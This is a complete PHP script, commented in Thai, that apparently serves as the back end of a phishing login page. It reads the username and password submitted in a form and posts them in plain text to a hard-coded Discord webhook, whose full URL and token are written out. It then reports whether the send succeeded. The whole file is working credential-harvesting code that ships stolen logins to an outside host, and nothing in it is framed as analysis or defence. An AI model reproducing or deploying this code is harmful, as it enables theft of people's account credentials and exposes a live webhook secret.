<?php
// รับข้อมูลจากฟอร์ม
$username = $_POST['username'];
$password = $_POST['password'];

// กำหนด URL ของ Discord Webhook
$webhook_url = "https://discord.com/api/webhooks/1312102853791187086/K3qnve_v8w_WFzwxJaBixKWPFKFm_2z_a4akH8jfN0HgFuuqFj8gfMz94AHBz2WL9DNa";  // 
// สร้างข้อความเพื่อส่งไปยัง Discord
$data = [
    "content" => "**ข้อมูลทดลองเก็บได้:**\nUsername: $username\nPassword: $password",
];

// ใช้ cURL เพื่อส่งข้อมูลไปยัง Discord Webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// ส่งคำขอไปยัง Webhook และตรวจสอบผลลัพธ์
$response = curl_exec($ch);
curl_close($ch);

// แสดงข้อความผลลัพธ์
if ($response) {
    echo "ข้อมูลได้ถูกส่งเรียบร้อยแล้ว!";
} else {
    echo "มีข้อผิดพลาดในการส่งข้อมูล!";
}
?>
